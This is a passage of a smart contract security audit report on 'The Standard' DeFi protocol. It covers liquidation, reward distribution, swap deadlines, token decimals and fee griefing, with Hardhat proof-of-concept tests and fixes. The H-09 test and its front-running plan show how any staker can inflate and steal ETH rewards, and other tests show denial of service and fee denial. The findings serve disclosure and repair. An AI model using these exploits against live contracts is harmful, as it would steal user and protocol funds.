+      // swap must receive at least €1447.2 - €754.72 = €692.48 = $734.032;
       const ethCollateralValue = swapValue.mul(DEFAULT_ETH_USD_PRICE).div(DEFAULT_EUR_USD_PRICE);
       const borrowFee = borrowValue.mul(PROTOCOL_FEE_RATE).div(HUNDRED_PC);
-      const minCollateralInUsd = borrowValue.add(borrowFee).mul(DEFAULT_COLLATERAL_RATE).div(HUNDRED_PC) // 110% of borrowed (with fee)
+      const minCollateralInUsd = borrowValue.add(borrowFee).mul(DEFAULT_COLLATERAL_RATE).div(HUNDRED_PC) // 120% of borrowed (with fee)
                                   .sub(ethCollateralValue) // some collateral will not be swapped
                                   .mul(DEFAULT_EUR_USD_PRICE).div(100000000) // convert to USD
                                   .div(BigNumber.from(10).pow(12)) // scale down because stablecoin is 6 dec
@@ -381,6 +384,20 @@ describe('SmartVault', async () => {
       expect(sqrtPriceLimitX96).to.equal(0);
       expect(txValue).to.equal(swapValue.sub(swapFee));
       expect(await protocol.getBalance()).to.equal(protocolBalance.add(swapFee));
+      
+      // @audit-info : credit the vault with `amountOutMinimum` worth of tokenOut to simulate completion of swap
+      await Stablecoin.mint(Vault.address, amountOutMinimum);
+      console.log("After Swap: is undercollateralized: %s, minted: %s, maxMintable: %s", await Vault.undercollateralised(), await Vault.minted(), await Vault.maxMintable());
+      expect(await Vault.undercollateralised()).to.eq(true);
+      
+      // @audit : vault can now be liquidated
+      await expect(VaultManager.connect(protocol).liquidateVault(1)).not.to.be.reverted;
+      const { minted, maxMintable, totalCollateralValue, collateral, liquidated } = await Vault.status();
+      expect(minted).to.equal(0);
+      expect(maxMintable).to.equal(0);
+      expect(totalCollateralValue).to.equal(0);
+      collateral.forEach(asset => expect(asset.amount).to.equal(0));
+      expect(liquidated).to.equal(true);
     });
 
     it('amount out minimum is 0 if over collateral still', async () => {
```

In the above test, once the swap is done, to simulate credit of the `tokenOut` we have credited the Vault with a value exactly equal to `amountOutMinimum`. We then checked if vault's liquidation was possible. Run the above via `npx hardhat test --grep 'invokes swaprouter with value for eth swap, paying fees to protocol'` to see the output:
```text
  SmartVault
    swaps
Before Swap: is undercollateralized: false, minted: 1206000000000000000000, maxMintable: 1257861635220125786163
After Swap:  is undercollateralized: true,  minted: 1206000000000000000000, maxMintable: 1205999999999999999999     <-------------- rounding-down leading to undercollateralization.
```

We were able to liquidate the vault successfully.

## Impact
- User loses his collateral and gets liquidated due to unfavourable swap implemented by the protocol

## Tools Used
Hardhat

## Recommendations
- We check for rounding-up of `requiredCollateralValue`.
- We perform an _"inverse-check"_ whether the returned value will cause the vault to be undercollateralized. If yes, increment the minimumOut variable. 

```diff
    function calculateMinimumAmountOut(bytes32 _inTokenSymbol, bytes32 _outTokenSymbol, uint256 _amount) private view returns (uint256) {
        ISmartVaultManagerV3 _manager = ISmartVaultManagerV3(manager);
        uint256 requiredCollateralValue = minted * _manager.collateralRate() / _manager.HUNDRED_PC();
+       if (requiredCollateralValue * _manager.HUNDRED_PC() < minted * _manager.collateralRate()) requiredCollateralValue++;
        uint256 collateralValueMinusSwapValue = euroCollateral() - calculator.tokenToEur(getToken(_inTokenSymbol), _amount);
-       return collateralValueMinusSwapValue >= requiredCollateralValue ?
+       uint256 minOut = collateralValueMinusSwapValue >= requiredCollateralValue ?
            0 : calculator.eurToToken(getToken(_outTokenSymbol), requiredCollateralValue - collateralValueMinusSwapValue);
+
+       // inverse-check
+       if (collateralValueMinusSwapValue < requiredCollateralValue) {
+           bool willGoUnder = minted > maxMintable() - calculator.tokenToEur(getToken(_inTokenSymbol), _amount) + calculator.tokenToEur(getToken(_outTokenSymbol), minOut);
+           if(willGoUnder) minOut++; 
+       }
+
+       return minOut;
    }
```

---

### <a id="h-08"></a>[H-08]
## **No incentive to liquidate small positions could result in protocol going underwater**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L114
<br>

## Summary
The protocol allows to create vaults and provide collateral for minting EUROs with no lower limit. As such, multiple low value vaults can exist. However, there is no incentive to liquidate low value vaults because of gas cost.

## Vulnerability Details
Liquidators liquidate users for the profit they can make. If there is no profit to be made than there will be no one to call the liquidate function. For example a vault could exist with a very low collateral value. This user is undercollateralized and must be liquidated in order to ensure that the protocol remains overcollateralized. If a liquidator wishes to liquidate this user, they will first need to stake some TST/EUROs which involves gas cost. Because the value of the collateral is so low, after gas costs, liquidators will not make a profit liquidating this user. In the end these low value vaults will never get liquidated, leaving the protocol with bad debt and can even cause the protocol to be undercollateralized with enough small value accounts being underwater.

## Attack Vector & Similar Issues
- See a [similar issue raised in the past](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/issues/1096) rated as **high impact** & **high likelihood**. It additionally highlights how this can become an attack vector (even by non-whales) on chains which aren't costly. The attack can be done by a malicious actor/group of actors who **_short the protocol and then open multiple such positions to attack the protocol_**.

- [Another description](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/issues/397) of the same issue.

## Impact
- The protocol can go underwater, complete loss of funds.

## Tools Used
Manual review

## Recommendations
- A potential fix would be to set a minimum threshold for collateral value which has to be exceeded in order for a user to mint EUROs

---

### <a id="h-09"></a>[H-09]
## **Attacker can create any amount of ETH as rewards**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L205
<br>

## Summary
The [distributeAssets()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L205) function has no access control and can be manipulated by any confirmed staker to increase their ETH reward to any value they wish to. There is no cost attached to the attack apart from the gas cost.

## PoC
Add a file `test\pwned.js` with the following code and run via `npx hardhat test --grep 'is pwned'` to see it pass.

```js
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { ETH, getNFTMetadataContract, DEFAULT_EUR_USD_PRICE, DEFAULT_ETH_USD_PRICE, DEFAULT_COLLATERAL_RATE, fastForward, DAY, POOL_FEE_PERCENTAGE, fullyUpgradedSmartVaultManager, PROTOCOL_FEE_RATE } = require("./common");

describe('LiquidationPoolManager', async () => {
  let LiquidationPoolManager, LiquidationPool, TokenManager,
  TST, EUROs, ERC20MockFactory, admin, user, protocol, liquidator, ClEurUsd, ClEthUsd, VaultManager, SmartVaultIndex;

  const rewardAmountForAsset = (rewards, symbol) => {
    return rewards.filter(reward => reward.symbol === ethers.utils.formatBytes32String(symbol))[0].amount;
  }

  beforeEach(async () => {
    [admin, user, protocol, liquidator] = await ethers.getSigners();

    ERC20MockFactory = await ethers.getContractFactory('ERC20Mock');
    TST = await ERC20MockFactory.deploy('The Standard Token', 'TST', 18);
    EUROs = await (await ethers.getContractFactory('EUROsMock')).deploy();
    ClEurUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('EUR / USD'); 
    await ClEurUsd.setPrice(DEFAULT_EUR_USD_PRICE);
    ClEthUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('ETH / USD'); 
    await ClEthUsd.setPrice(DEFAULT_ETH_USD_PRICE);

    TokenManager = await (await ethers.getContractFactory('TokenManagerMock')).deploy(ETH, ClEthUsd.address);
    const SmartVaultDeployer = await (await ethers.getContractFactory('SmartVaultDeployerV3')).deploy(ETH, ClEurUsd.address);
    SmartVaultIndex = await (await ethers.getContractFactory('SmartVaultIndex')).deploy();
    const NFTMetadataGenerator = await (await getNFTMetadataContract()).deploy();
    const SwapRouterMock = await (await ethers.getContractFactory('SwapRouterMock')).deploy();
    const MockWeth = await (await ethers.getContractFactory('WETHMock')).deploy();
    VaultManager = await fullyUpgradedSmartVaultManager(
      DEFAULT_COLLATERAL_RATE, PROTOCOL_FEE_RATE, EUROs.address, protocol.address, 
      liquidator.address, TokenManager.address, SmartVaultDeployer.address,
      SmartVaultIndex.address, NFTMetadataGenerator.address, MockWeth.address,
      SwapRouterMock.address
    );
    await SmartVaultIndex.setVaultManager(VaultManager.address);
    await EUROs.grantRole(await EUROs.DEFAULT_ADMIN_ROLE(), VaultManager.address);
    await VaultManager.connect(user).mint();
    
    const LiquidationPoolManagerContract = await ethers.getContractFactory('LiquidationPoolManager');
    LiquidationPoolManager = await LiquidationPoolManagerContract.deploy(
      TST.address, EUROs.address, VaultManager.address, ClEurUsd.address, protocol.address, POOL_FEE_PERCENTAGE
    );
    await VaultManager.setLiquidatorAddress(LiquidationPoolManager.address);
    await VaultManager.setProtocolAddress(LiquidationPoolManager.address);
    LiquidationPool = await ethers.getContractAt('LiquidationPool', await LiquidationPoolManager.pool());
    await EUROs.grantRole(await EUROs.BURNER_ROLE(), LiquidationPool.address);
  });
  
  describe('The Standard', async () => {
    it('is pwned', async () => {
      // Step 1. stake TST & EUROs
      const tstStake = 1;
      const eurosStake = 1;
      await TST.mint(user.address, tstStake);
      await EUROs.mint(user.address, eurosStake);
      await TST.connect(user).approve(LiquidationPool.address, tstStake);
      await EUROs.connect(user).approve(LiquidationPool.address, eurosStake);
      await LiquidationPool.connect(user).increasePosition(tstStake, eurosStake);
      await fastForward(DAY);
      let { _rewards, _position } = await LiquidationPool.position(user.address);
      expect(_position.EUROs).to.equal(eurosStake);
      expect(_position.TST).to.equal(tstStake);
      
      // Step 2. ATTACK by calling distributeAssets() directly
      const pwned = ethers.utils.parseEther('52'); // @audit-info : amount to be siphoned off, could be any amount
      
      const Token = {symbol: "0x4554480000000000000000000000000000000000000000000000000000000000" , addr: ethers.constants.AddressZero, dec: 18, clAddr: "0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9", clDec: 8};
      const asset = {token: Token, amount: pwned};
      const assets = [asset];
      const FAKE_HUNDRED_PC = 0; // @audit : passing this as zero ensures the attacker has to pay no EUROs
      await LiquidationPool.connect(user).distributeAssets(assets, 1, FAKE_HUNDRED_PC, { value: ethers.utils.parseEther('0') });
      
      ({ _rewards, _position } = await LiquidationPool.position(user.address));
      expect(rewardAmountForAsset(_rewards, 'ETH')).equal(pwned); // @audit : attacker's `rewards` updated
      expect(_position.EUROs).to.equal(eurosStake); // attacker had to pay nothing!
      expect(_position.TST).to.equal(tstStake);
      // now remove the staked amount too
      await LiquidationPool.connect(user).decreasePosition(tstStake, eurosStake);
      ({ _rewards, _position } = await LiquidationPool.position(user.address));
      expect(_position.EUROs).to.equal(0);
      expect(_position.TST).to.equal(0);
    });
  });
});
```

## Attack Vector Explained
The 3 params of the function `distributeAssets()` can be created manually:
```js
    function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external payable {
```

The PoC code creates the `ILiquidationPoolManager.Asset[] memory _assets` parameter by using ETH token symbol `0x4554480000000000000000000000000000000000000000000000000000000000`, its address as `0` and its chainlink feed address as `0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9` all of which are real, valid values. However, inside the `_assets` struct it sets the `amount` as an arbitrary value which the attacker wants to siphon off (52 ETH in our case).<br>
Also, we will pass `_hundredPC` as zero. This is because the function calculates `costInEuros`, which is the cost the holder needs to pay. By setting `_hundredPC` as zero, it evaluates to `0` and no cost will have to be paid.
```js
    uint256 costInEuros = _portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) / uint256(priceEurUsd)
                            * _hundredPC / _collateralRate;
```

Now, all the attacker has to do is wait for the `LiquidationPool` contract to have the desired amount of ETH in it and then call [claimRewards](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L164) to get the ETH credited into his wallet. Notice that this transfer of ETH into the `LiquidationPool` contract from the `LiquidationPoolManager` contract happens automatically when a vault is liquidated by anybody calling the [runLiquidation()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPoolManager.sol#L59) function. Once that call completes, the attacker can call `claimRewards()` and effectively steal someone else's share of rewards. The other holder will be left without any ETH to claim even though his `rewards` variable will show that he is eligible.
<br>

In fact, the best attack path for the attacker would be - 
- Position himself as a confirmed holder by staking the minimum amount so that he can attack later.
- Monitor the mempool for someone to call `runLiquidation()`. Let's call this transaction `tx`.
- Calculate & note the ETH rewards which will be distributed in this call.
- Front-run `tx` and directly call `distributeAssets()` with his maliciously crafted parameters, keeping `amount` as the total ETH reward in `tx`.
- Back-run `tx` and call `claimRewards()` to get away with stealing the entire ETH before anyone is the wiser. Then call `decreasePosition()` to remove his miniscule staked amount too.

Other holders calling `claimRewards()` now will see their call revert as there are no funds inside `LiquidationPool`.

### Note-1
The PoC shows only one holder in the pool. If there are more holders, this attack increments their `rewards` variable too. However the attacker will move first to claim the rewards hence leaving no ETH for others.

### Note-2
This would work for any other ERC20 collateral token too, **_if_** the `approve()` is in place - that is, the `LiquidationPoolManager` has approved the amount before the attack.

## Impact
- Major loss of protocol funds
- Some other holder loses his reward

## Tools Used
Hardhat

## Recommendations
Add the `onlyManager` access modifier to the `distributeAssets()` function:

```diff
-    function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external payable {
+    function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external payable onlyManager {
```

---

### <a id="h-10"></a>[H-10]
## **Possible to DoS all major functions of the protocol**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L119
<br>

## Summary & Vulnerability Details
An unbounded looping is implemented over the `pendingStakes[]` array inside:
- The [consolidatePendingStakes()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L121) function which is used across major functions of the protocol like - 
    - [increasePosition()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L134)
    - [decreasePosition()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L149)
    - [distributeAssets()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L205) 
- [distributeFees()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L190)

`consolidatePendingStakes()` loops through all the pending stakes in the pool at [L121](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L121):
```js
    for (int256 i = 0; uint256(i) < pendingStakes.length; i++) {
```

Since there is no lower limit on the amount being staked, a griefer or malicuous competitor interested in the bringing the protocol down can create multiple pending stakes such that when `consolidatePendingStakes()` anytime, it runs out of gas and results in Denial of Service.
<br>

The griefer will make the following call enough number of times -
```js
await LiquidationPool.increasePosition(1, 0);
```

Note that for such a small value, due to rounding-down precision loss, no minting fee is charged by the protocol. So the cost of attack would be the sum of the value of all the TSTs (or EUROs) + gas fees.
<br>

Checking this via a unit test shows that the execution fails after around 2500 pending stakes on the local network. Add this test to check (took around 5 hours to execute locally on my system) which made use of TST and cost only `0.0000000000000025 euro`:
```js
    it('is possible to DoS due to huge number of pendingStakes', async () => {
      const stake1 = 1;
      await TST.mint(user1.address, ethers.utils.parseEther('1'));
      await TST.connect(user1).approve(LiquidationPool.address, ethers.utils.parseEther('1'));

      for (let i=1; i<=2500; i++) {
        console.log(i);
        await LiquidationPool.connect(user1).increasePosition(stake1, 0);
      }

    });
```

## Impact
- No new user will be able to stake in the pool by calling `increasePosition()`
- No existing user will be able to withdraw their stake by calling `decreasePosition()`
- No existing user can be liquidated by the protocol via a call to `runLiquidation()` since it internally calls `distributeAssets()` which too calls `consolidatePendingStakes()`
- No distribution of fees via `distributeFees()` possible anymore.

For all practical purposes, protocol becomes non-functional and will soon go underwater due to inability to get rid of bad debts. It is to be noted that there are no admin functions which can help delete such stakes or rescue the protocol from this state.<br>

There is also a chance that this attack be mounted by an attacker who has first taken a huge loan and upon seeing the risk of liquidation, calculates that it is cheaper to spend TSTs (or EUROs) to break the protocol instead of adding collateral to save their undercollateralized position.

## Tools Used
Manual review

## Recommendations
- One option is to have a minimum threshold for the staked amount so that the cost of the attack goes up significantly.
- Also introduce some admin functions which can be used to rescue the protocol by deleting pending stakes (by specifying a range to delete in batches instead of looping all at once), and consider returning the invested `amount - fees`.

---

<br><br>

## **MEDIUM-SEVERITY BUGS**
---

### <a id="m-01"></a>[M-01]
## **swap() deadline incorrectly set to block.timestamp**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L223
<br>

## Summary
[swap()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L214-L231) function executes the `ISwapRouter.ExactInputSingleParams()` function with `deadline` as `block.timestamp`. This has basically no effect and should rather be an actual `uint256` value.

```js
    function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external onlyOwner {
        uint256 swapFee = _amount * ISmartVaultManagerV3(manager).swapFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
        address inToken = getSwapAddressFor(_inToken);
        uint256 minimumAmountOut = calculateMinimumAmountOut(_inToken, _outToken, _amount);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
                tokenIn: inToken,
                tokenOut: getSwapAddressFor(_outToken),
                fee: 3000,
                recipient: address(this),
@----->         deadline: block.timestamp,
                amountIn: _amount - swapFee,
                amountOutMinimum: minimumAmountOut,
                sqrtPriceLimitX96: 0
            });
        inToken == ISmartVaultManagerV3(manager).weth() ?
            executeNativeSwapAndFee(params, swapFee) :
            executeERC20SwapAndFee(params, swapFee);
    }
```

Since `block.timestamp` is always relative, using it in any way is equivalent to using no deadline at all. Needs to use a user defined input to effectively enforce any deadline.<br>
Without a deadline, the transaction might be left hanging in the mempool and be executed way later than the user wanted. That could lead to user getting a worse price, because a validator can just hold onto the transaction. And when it does get around to putting the transaction in a block, it'll be `block.timestamp`, so they've got no protection there.

## Vulnerability Details
This is a well-known vulnerability and here's an article detailing the impact and how Uniswap has a very clear deadline set, in addition to the minimumOut check - https://web.archive.org/web/20230525014603/https://blog.bytes032.xyz/p/why-you-should-stop-using-block-timestamp-as-deadline-in-swaps

## A Simple Example To Explain The Exploit
Alice wants to swap 100 tokens for 1 ETH and later sell the 1 ETH.
<br>

The transaction is submitted to the mempool, however, Alice chose a transaction fee that is too low for miners to be interested in including her transaction in a block. The transaction stays pending in the mempool for extended periods, which could be hours, days, weeks, or even longer.
<br>

When the average gas fee dropped far enough for Alice's transaction to become interesting again for miners to include it, her swap will be executed. In the meantime, the price of ETH could have drastically changed. She will still get 1 ETH but the token value of that output might be significantly lower.
<br>

She has unknowingly performed a bad trade due to the pending transaction she forgot about.
<br>
<br>

An even worse way this issue can be maliciously exploited is through MEV:
<br>

The swap transaction is still pending in the mempool. Average fees are still too high for miners to be interested in it.
<br>

The price of tokens has gone up significantly since the transaction was signed, meaning Alice would receive a lot more ETH when the swap is executed. But that also means that her maximum slippage value is outdated and would allow for significant slippage.
<br>

A MEV bot detects the pending transaction. Since the outdated maximum slippage value now allows for high slippage, the bot sandwiches Alice, resulting in significant profit for the bot and significant loss for Alice.

## Impact
This could lead to users getting a worse price, because a validator can just hold onto the transaction. And when it does get around to putting the transaction in a block, it'll be `block.timestamp` (which is always relative), so they've got no protection there.

## Tools Used
Manual inspection.

## Recommendations
Add an additional param `deadline` inside the swap function and make use of that:

```diff
-   function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external onlyOwner {
+   function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount, uint256 deadline) external onlyOwner {
        uint256 swapFee = _amount * ISmartVaultManagerV3(manager).swapFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
        address inToken = getSwapAddressFor(_inToken);
        uint256 minimumAmountOut = calculateMinimumAmountOut(_inToken, _outToken, _amount);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
                tokenIn: inToken,
                tokenOut: getSwapAddressFor(_outToken),
                fee: 3000,
                recipient: address(this),
-               deadline: block.timestamp,
+               deadline: deadline,
                amountIn: _amount - swapFee,
                amountOutMinimum: minimumAmountOut,
                sqrtPriceLimitX96: 0
            });
        inToken == ISmartVaultManagerV3(manager).weth() ?
            executeNativeSwapAndFee(params, swapFee) :
            executeERC20SwapAndFee(params, swapFee);
    }

```

---

### <a id="m-02"></a>[M-02]
## **Protocol unable to handle tokens with decimals() > 18**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L220
<br>

## Summary
- [distributeAssets()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L220) assumes that all tokens in the protocol will have at most 18 decimals and uses `_portion * 10 ** (18 - asset.token.dec)` in its calculations. This is not necessarily true and will fail due to underflow whenever `token decimals() > 18`.
- Similar logic error effects the [swap()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L217) functionality.

[LiquidationPool.sol#L220](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L220)
```js
    function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external payable {
        consolidatePendingStakes();
        (,int256 priceEurUsd,,,) = Chainlink.AggregatorV3Interface(eurUsd).latestRoundData();
        uint256 stakeTotal = getStakeTotal();
        uint256 burnEuros;
        uint256 nativePurchased;
        for (uint256 j = 0; j < holders.length; j++) {
            Position memory _position = positions[holders[j]];
            uint256 _positionStake = stake(_position);
            if (_positionStake > 0) {
                for (uint256 i = 0; i < _assets.length; i++) {
                    ILiquidationPoolManager.Asset memory asset = _assets[i];
                    if (asset.amount > 0) {
                        (,int256 assetPriceUsd,,,) = Chainlink.AggregatorV3Interface(asset.token.clAddr).latestRoundData();
                        uint256 _portion = asset.amount * _positionStake / stakeTotal;
@------------------>    uint256 costInEuros = _portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) / uint256(priceEurUsd)
                            * _hundredPC / _collateralRate;
                        ...
                        ...
    }
```

[SmartVaultV3.sol#L217](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L217)
```js
    function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external onlyOwner {
        uint256 swapFee = _amount * ISmartVaultManagerV3(manager).swapFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
        address inToken = getSwapAddressFor(_inToken);
@-----> uint256 minimumAmountOut = calculateMinimumAmountOut(_inToken, _outToken, _amount);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
                tokenIn: inToken,
                tokenOut: getSwapAddressFor(_outToken),
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: _amount - swapFee,
                amountOutMinimum: minimumAmountOut,
                sqrtPriceLimitX96: 0
            });
        inToken == ISmartVaultManagerV3(manager).weth() ?
            executeNativeSwapAndFee(params, swapFee) :
            executeERC20SwapAndFee(params, swapFee);
    }
```

## Vulnerability Details
The above mentioned code will revert for such tokens which have `decimals()` greater than 18. This issue is also visible in [contracts/utils/PriceCalculator.sol#L40](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/utils/PriceCalculator.sol#L40) inside the function `getTokenScaleDiff()` which is in turn called by functions 
- `tokenToEurAvg()` [#L45](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/utils/PriceCalculator.sol#L45)
- `tokenToEur()` [#L53](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/utils/PriceCalculator.sol#L53) 
- `eurToToken()` [#L64](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/utils/PriceCalculator.sol#L64)
used by **_in-scope file_** `SmartVaultV3.sol` to calculate [calculateMinimumAmountOut()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L209-L211), which is integral to [swap()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L217).<br>
These functions will revert if a token with decimals > 18 is encountered.

## Impact
Critical functions of the protocol like swap(), distributeAssets() do not function for tokens with decimals > 18.

## Tools Used
Manual inspection.

## Recommendations
This would require changes in multiple places. Consider operating with a higher precision like 36 decimals instead of the current 18, wherein every token is converted to 36 places of decimal precision and then converted back to original scale when required.

---

### <a id="m-03"></a>[M-03]
## **Griefer can deny holders of their fair share of fees**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPoolManager.sol#L35-L40
<br>

## Summary
[LiquidationPoolManager::distributeFees()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPoolManager.sol#L35-L40) can be called by anyone to distribute the `_feesForPool` to the `holders`. However, this distribution happens only when $\_feesForPool > 0$. With the current `poolFeePercentage` at `50% (50000)` and `HUNDRED_PC` at `100000`, a Griefer can call `distributeFees()` whenever `eurosToken.balanceOf(address(this)) = 1`, not allowing it to accumulate it to a higher value:

[LiquidationPoolManager.sol#L35-L40](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPoolManager.sol#L35-L40)
```js
    function distributeFees() public {
        IERC20 eurosToken = IERC20(EUROs);
@--->   uint256 _feesForPool = eurosToken.balanceOf(address(this)) * poolFeePercentage / HUNDRED_PC;
@--->   if (_feesForPool > 0) {
            eurosToken.approve(pool, _feesForPool);
            LiquidationPool(pool).distributeFees(_feesForPool);
        }
@--->   eurosToken.transfer(protocol, eurosToken.balanceOf(address(this)));
    }
```

$$
\begin{equation}
\begin{split}   \_feesForPool &= (eurosToken.balanceOf(address(this)) * poolFeePercentage) \div {HUNDRED\_PC} \\
                &= (1 * 50000) \div {100000} \\
                &= 50000 \div {100000} \\
                &= 0 \text{ (rounding down by solidity)}
\end{split}
\end{equation}
$$

This causes the `eurosToken.balanceOf(address(this))` of 1 wei to be sent to the `protocol`, effectively resetting the counting.<br>
Note that this attack can cause further harm if in future `poolFeePercentage` is set to something like `30% (30000)`, where the griefer can call the function as long as the `eurosToken.balanceOf(address(this))` is less than 4.

$$
\begin{equation}
\begin{split}   \_feesForPool &= (eurosToken.balanceOf(address(this)) * poolFeePercentage) \div {HUNDRED\_PC} \\
                &= (3 * 30000) \div {100000} \\
                &= 90000 \div {100000} \\
                &= 0 \text{ (rounding down by solidity)}
\end{split}
\end{equation}
$$

<br>

**_Note_** that this issue may arise also without a griefer, under the normal flow of operations. Users calling [LiquidationPool::increasePosition()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L137) and [LiquidationPool::decreasePosition()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L151) functions also internally call `ILiquidationPoolManager(manager).distributeFees()` which could give rise to an identical issue.
```js
    function increasePosition(uint256 _tstVal, uint256 _eurosVal) external {
        require(_tstVal > 0 || _eurosVal > 0);
        consolidatePendingStakes();
@---->  ILiquidationPoolManager(manager).distributeFees();
        if (_tstVal > 0) IERC20(TST).safeTransferFrom(msg.sender, address(this), _tstVal);
        if (_eurosVal > 0) IERC20(EUROs).safeTransferFrom(msg.sender, address(this), _eurosVal);
        pendingStakes.push(PendingStake(msg.sender, block.timestamp, _tstVal, _eurosVal));
        addUniqueHolder(msg.sender);
    }

    function decreasePosition(uint256 _tstVal, uint256 _eurosVal) external {
        consolidatePendingStakes();
@---->  ILiquidationPoolManager(manager).distributeFees();
        require(_tstVal <= positions[msg.sender].TST && _eurosVal <= positions[msg.sender].EUROs, "invalid-decr-amount");
        if (_tstVal > 0) {
            IERC20(TST).safeTransfer(msg.sender, _tstVal);
            positions[msg.sender].TST -= _tstVal;
        }
        if (_eurosVal > 0) {
            IERC20(EUROs).safeTransfer(msg.sender, _eurosVal);
            positions[msg.sender].EUROs -= _eurosVal;
        }
        if (empty(positions[msg.sender])) deletePosition(positions[msg.sender]);
    }

```

## Vulnerability Details
Under ideal conditions, a 'fair' user will let the `eurosToken.balanceOf(address(this))` accumulate to a higher value and then eventually call the `LiquidationPoolManager::distributeFees()` function, benefitting the holders and sweeping any leftover amount into the `protocol`. <br>
This is thwarted by any griefer who sees an opportunity to deny the holders of their rightful fees.

## PoC
Apply the following patch inside file `test/liquidationPool.js` and run via `npx hardhat test --grep "pays no fee due to rounding-down"` to see the test pass:

```diff
diff --git a/test/liquidationPool.js b/test/liquidationPool2.js
index 8dd8580..c9e68d6 100644
--- a/test/liquidationPool.js
+++ b/test/liquidationPool2.js
@@ -146,6 +146,37 @@ describe('LiquidationPool', async () => {
       ({_position} = await LiquidationPool.position(user3.address));
       expect(_position.EUROs).to.equal(ethers.utils.parseEther('25'));
     });
+
+    it('pays no fee due to rounding-down', async () => {
+      expect(await EUROs.balanceOf(Protocol.address)).to.equal(0);
+
+      let tstStakeValue = ethers.utils.parseEther('100');
+      await TST.mint(user1.address, tstStakeValue.mul(2));
+      await TST.connect(user1).approve(LiquidationPool.address, tstStakeValue.mul(2));
+
+      await LiquidationPool.connect(user1).increasePosition(tstStakeValue, 0);
+      
+      let fees = 1;
+      await EUROs.mint(LiquidationPoolManager.address, fees);
+      
+      await LiquidationPoolManager.distributeFees();
+      
+      // @audit-info : no fee received by user1, all sweeped up by protocol
+      let { _position } = await LiquidationPool.position(user1.address);
+      expect(_position.EUROs).to.equal(0);
+      expect(await EUROs.balanceOf(Protocol.address)).to.equal(fees);
+      
+      // second round
+      await LiquidationPool.connect(user1).increasePosition(tstStakeValue, 0);
+      await EUROs.mint(LiquidationPoolManager.address, fees);
+      await LiquidationPoolManager.distributeFees();
+
+      // @audit-info : again, no fee received by user1, as the fee did not get a chance to accumulate
+      // @audit : had the fee accumulated correctly, user1 would have received 50% of 2 = 1 wei
+      ({ _position } = await LiquidationPool.position(user1.address));
+      expect(_position.EUROs).to.equal(0);
+      expect(await EUROs.balanceOf(Protocol.address)).to.equal(fees * 2);
+    });
   });
 
   describe('decrease position', async () => {
```

## Impact
- Loss of rightful fee for the holders.

## Tools Used
Manual inspection, Hardhat.

## Recommendations
